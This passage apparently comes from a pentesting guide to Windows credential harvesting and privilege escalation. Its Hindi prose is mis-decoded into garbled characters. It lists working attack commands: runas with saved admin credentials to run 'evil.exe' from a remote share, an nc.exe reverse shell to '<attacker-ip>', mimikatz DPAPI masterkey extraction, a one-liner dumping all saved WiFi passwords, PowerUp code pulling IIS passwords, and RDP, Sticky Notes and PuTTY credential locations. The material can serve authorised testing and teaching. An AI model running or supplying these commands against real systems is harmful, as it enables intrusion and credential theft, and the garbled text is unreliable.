cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
рддрдм рдЖрдк `/savecred` рд╡рд┐рдХрд▓реНрдк рдХреЗ рд╕рд╛рде `runas` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рд╕рд╣реЗрдЬреЗ рдЧрдП рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдПрдХ SMB рд╢реЗрдпрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рджреВрд░рд╕реНрде рдмрд╛рдЗрдирд░реА рдХреЛ рдХреЙрд▓ рдХрд░ рд░рд╣рд╛ рд╣реИред
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
рджрд┐рдП рдЧрдП рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде `runas` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), рдпрд╛ [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1) рд╕реЗ рднреА рдбреЗрдЯрд╛ рд▓реАрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### DPAPI

рд╕рд┐рджреНрдзрд╛рдВрдд рдореЗрдВ, рдбреЗрдЯрд╛ рд╕рдВрд░рдХреНрд╖рдг API рдХрд┐рд╕реА рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рд╕рдордорд┐рдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддрд╛ рд╣реИ; рд╡рд╛рд╕реНрддрд╡рд┐рдХрддрд╛ рдореЗрдВ, рд╡рд┐рдВрдбреЛрдЬ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдЗрд╕рдХрд╛ рдкреНрд░рд╛рдердорд┐рдХ рдЙрдкрдпреЛрдЧ рдЕрд╕рдордорд┐рдд рдирд┐рдЬреА рдХреБрдВрдЬреАрдпреЛрдВ рдХреЗ рд╕рдордорд┐рдд рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рд╕реАрдХреНрд░реЗрдЯ рдПрдВрдЯреНрд░реЛрдкреА рдХреЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдпреЛрдЧрджрд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред

**DPAPI рд╡рд┐рдХрд╛рд╕рдХреЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрдСрди рд╕реАрдХреНрд░реЗрдЯ рд╕реЗ рдЙрддреНрдкрдиреНрди рд╕рдордорд┐рдд рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреБрдВрдЬреАрдпреЛрдВ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**, рдпрд╛ рд╕рд┐рд╕реНрдЯрдо рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЗ рдорд╛рдорд▓реЗ рдореЗрдВ, рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдбреЛрдореЗрди рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕реАрдХреНрд░реЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА RSA рдХреБрдВрдЬреАрдпреЛрдВ рдХреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реА DPAPI рдХреБрдВрдЬреА `%APPDATA%\Microsoft\Protect\{SID}` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬрд╣рд╛рдВ {SID} рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ [рд╕реБрд░рдХреНрд╖рд╛ рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛](https://en.wikipedia.org/wiki/Security\_Identifier) рд╣реЛрддрд╛ рд╣реИред **DPAPI рдХреБрдВрдЬреА рдЙрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдирд┐рдЬреА рдХреБрдВрдЬреАрдпреЛрдВ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдорд╛рд╕реНрдЯрд░ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд╣реА рдПрдХ рд╣реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИ**ред рдпрд╣ рдЖрдорддреМрд░ рдкрд░ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдбреЗрдЯрд╛ рдХреЗ 64 рдмрд╛рдЗрдЯ рдХрд╛ рд╣реЛрддрд╛ рд╣реИред (рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд рд╣реЛрддреА рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЖрдк рдЗрд╕реЗ cmd рд╕реЗ `dir` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реВрдЪреАрдмрджреНрдз рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдЖрдк PS рд╕реЗ рдЗрд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред
```
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
рдЖрдк **mimikatz рдореЙрдбреНрдпреВрд▓** `dpapi::masterkey` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдЪрд┐рдд рддрд░реАрдХреЗ рд╕реЗ (`/pvk` рдпрд╛ `/rpc`) рдЗрд╕реЗ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдорд╛рд╕реНрдЯрд░ рдкрд╛рд╕рд╡рд░реНрдб рджреНрд╡рд╛рд░рд╛ рд╕рдВрд░рдХреНрд╖рд┐рдд **рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдлрд╝рд╛рдЗрд▓реЗрдВ** рдЖрдорддреМрд░ рдкрд░ рдЗрд╕ рд╕реНрдерд╛рди рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрддреА рд╣реИрдВ:
```
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
рдЖрдк **mimikatz рдореЙрдбреНрдпреВрд▓** `dpapi::cred` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЙрдЪрд┐рдд `/masterkey` рдХреЗ рд╕рд╛рде рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
рдЖрдк **sekurlsa::dpapi** рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рд╛рде **рдореЗрдореЛрд░реА** рд╕реЗ рдХрдИ DPAPI **рдорд╛рд╕реНрдЯрд░рдХреА** рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЕрдЧрд░ рдЖрдк рд░реВрдЯ рд╣реИрдВ)ред

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕

**PowerShell рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕** рдЕрдХреНрд╕рд░ **рд╕реНрдХреНрд░рд┐рдкреНрдЯрд┐рдВрдЧ** рдФрд░ рд╕реНрд╡рдЪрд╛рд▓рди рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ, рдЬреЛ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реЛрддреЗ рд╣реИрдВред рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ **DPAPI** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЗрдиреНрд╣реЗрдВ рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдХреЗрд╡рд▓ рдЙрдиреНрд╣реАрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрдиреНрд╣реАрдВ рдХрдВрдкреНрдпреВрдЯрд░ рдкрд░ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд╣рд╛рдВ рд╡реЗ рдмрдирд╛рдП рдЧрдП рдереЗред

рдЗрд╕рдореЗрдВ рд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд PS рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### рд╡рд╛рдИрдлрд╝рд╛рдИ

---

#### рд╡рд╛рдИрдлрд╝рд╛рдИ рдХреНрдпрд╛ рд╣реИ?

рд╡рд╛рдИрдлрд╝рд╛рдИ (WiFi) рдПрдХ рддрдХрдиреАрдХреА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдмрд┐рдирд╛ рддрд╛рд░ рдХреЗ рдЗрдВрдЯрд░рдиреЗрдЯ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рд░реЗрдбрд┐рдпреЛ рддрдХрдиреАрдХ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдбреЗрдЯрд╛ рдХреЛ рд╡рд╛рдпрд░рд▓реЗрд╕ рд░реВрдк рд╕реЗ рдЯреНрд░рд╛рдВрд╕рдорд┐рдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╡рд╛рдИрдлрд╝рд╛рдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдШрд░, рдСрдлрд┐рд╕, рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд╕реНрдерд╛рдиреЛрдВ рдФрд░ рдЕрдиреНрдп рд╕реНрдерд╛рдиреЛрдВ рдореЗрдВ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕реЗрд╕ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

#### рд╡рд╛рдИрдлрд╝рд╛рдИ рд╣реИрдХрд┐рдВрдЧ

рд╡рд╛рдИрдлрд╝рд╛рдИ рд╣реИрдХрд┐рдВрдЧ рдПрдХ рдкреНрд░рдХрд╛рд░ рдХреА рд╕рд╛рдЗрдмрд░ рд╣рдорд▓рд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣реИрдХрд░ рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд░рд┐рдд рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрдиреЗ рд▓рд╛рдн рдХреЗ рд▓рд┐рдП рдЕрдкрд╣рд░рдг рдХрд░рддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣реИрдХрд░ рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдЙрдореНрдореАрдж рд╕реЗ рдХрдо рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рдбреЗрдЯрд╛ рдФрд░ рдЧреЛрдкрдиреАрдпрддрд╛ рдХреЛ рдЦрддрд░реЗ рдореЗрдВ рдбрд╛рд▓рддреЗ рд╣реИрдВред

#### рд╡рд╛рдИрдлрд╝рд╛рдИ рд╣реИрдХрд┐рдВрдЧ рдЯреЗрдХреНрдирд┐рдХреНрд╕

рд╡рд╛рдИрдлрд╝рд╛рдИ рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреА рдЯреЗрдХреНрдирд┐рдХреНрд╕ рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдпрд╣рд╛рдВ рдХреБрдЫ рдкреНрд░рдореБрдЦ рдЯреЗрдХреНрдирд┐рдХреНрд╕ рд╣реИрдВ:

- **рд╡рд╛рдИрдлрд╝рд╛рдИ рдкрд╛рд╕рд╡рд░реНрдб рдХреНрд░реИрдХрд┐рдВрдЧ**: рдЗрд╕ рдЯреЗрдХреНрдирд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрдХрд░ рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рддреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдЕрдирдзрд┐рдХреГрдд рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- **рд╡рд╛рдИрдлрд╝рд╛рдИ рдЬрд╛рдорд┐рдВрдЧ**: рдЗрд╕ рдЯреЗрдХреНрдирд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрдХрд░ рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдХреЛ рдЬрд╛рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЗрдВрдЯрд░рдиреЗрдЯ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ рдореЗрдВ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред
- **рд╡рд╛рдИрдлрд╝рд╛рдИ рд╕реНрдирд┐рдлрд╝рд┐рдВрдЧ**: рдЗрд╕ рдЯреЗрдХреНрдирд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрдХрд░ рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд░рд┐рдд рдбреЗрдЯрд╛ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рдЕрдкрд╣рд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
- **рд╡рд╛рдИрдлрд╝рд╛рдИ рдлрд┐рд╢рд┐рдВрдЧ**: рдЗрд╕ рдЯреЗрдХреНрдирд┐рдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрдХрд░ рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдзреЛрдЦрд╛ рджреЗрдХрд░ рдЙрдирдХреЗ рдЧреЛрдкрдиреАрдпрддрд╛ рдФрд░ рдЦрд╛рддрд╛ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред

рд╡рд╛рдИрдлрд╝рд╛рдИ рд╣реИрдХрд┐рдВрдЧ рдПрдХ рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЕрдкрдиреЗ рд╡рд╛рдИрдлрд╝рд╛рдИ рдиреЗрдЯрд╡рд░реНрдХ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рддрд░реНрдХ рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдПред
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
### рд╕рд╣реЗрдЬреЗ рдЧрдП RDP рдХрдиреЗрдХреНрд╢рди

рдЖрдк рдЙрдиреНрд╣реЗрдВ `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\` рдкрд░ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ\
рдФрд░ `HKCU\Software\Microsoft\Terminal Server Client\Servers\` рдореЗрдВ

### рд╣рд╛рд▓ рд╣реА рдореЗрдВ рдЪрд▓рд╛рдП рдЧрдП рдХрдорд╛рдВрдбреНрд╕
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **рд░рд┐рдореЛрдЯ рдбреЗрд╕реНрдХрдЯреЙрдк рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдореИрдиреЗрдЬрд░**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
рдЙрдЪрд┐рдд `/masterkey` рдХреЗ рд╕рд╛рде **Mimikatz** `dpapi::rdg` рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ рдХрд┐рд╕реА рднреА .rdg рдлрд╝рд╛рдЗрд▓ рдХреЛ **рдбрд┐рдХреНрд░рд┐рдкреНрдЯ** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред\
рдЖрдк **Mimikatz** `sekurlsa::dpapi` рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рд╛рде рдореЗрдореЛрд░реА рд╕реЗ рдХрдИ DPAPI рдорд╛рд╕реНрдЯрд░рдХреА рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

### рд╕реНрдЯрд┐рдХреА рдиреЛрдЯреНрд╕

рд▓реЛрдЧ рдЕрдХреНрд╕рд░ рд╡рд┐рдВрдбреЛрдЬ рд╡рд░реНрдХрд╕реНрдЯреЗрд╢рди рдкрд░ рд╕реНрдЯрд┐рдХреА рдиреЛрдЯреНрд╕ рдРрдк рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкрд╛рд╕рд╡рд░реНрдб** рдФрд░ рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рд╕рд╣реЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕реЗ рдПрдХ рдбреЗрдЯрд╛рдмреЗрд╕ рдлрд╝рд╛рдЗрд▓ рдорд╛рдирддреЗ рд╣реБрдП рдирд╣реАрдВред рдпрд╣ рдлрд╝рд╛рдЗрд▓ `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрддреА рд╣реИ рдФрд░ рдЗрд╕реЗ рдЦреЛрдЬрдиреЗ рдФрд░ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрд╢рд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реЛрддреА рд╣реИред

### AppCmd.exe

**рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ AppCmd.exe рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП рдФрд░ рдЙрдЪреНрдЪ рдЕрд╡рд░реЛрдз рд╕реНрддрд░ рдХреЗ рддрд╣рдд рдЪрд▓рд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддрд╛ рд╣реИред\
рдпрджрд┐ рдпрд╣ рдлрд╝рд╛рдЗрд▓ рдореМрдЬреВрдж рд╣реИ рддреЛ рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рдХреБрдЫ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рд╣реИрдВ рдФрд░ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВред

рдпрд╣ рдХреЛрдб _**PowerUP**_ рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЧрдпрд╛ рдерд╛:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ `C:\Windows\CCM\SCClient.exe` рдореМрдЬреВрдж рд╣реИред\
рдЗрдВрд╕реНрдЯреЙрд▓рд░реНрд╕ **SYSTEM рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдП рдЬрд╛рддреЗ рд╣реИрдВ**, рдмрд╣реБрдд рд╕рд╛рд░реЗ **DLL Sideloading (рдЬрд╛рдирдХрд╛рд░реА** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**) рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрдХреНрд░рдорд┐рдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА (рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓)

### рдкреБрдЯреА рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH рд╣реЛрд╕реНрдЯ рдХреБрдВрдЬреА

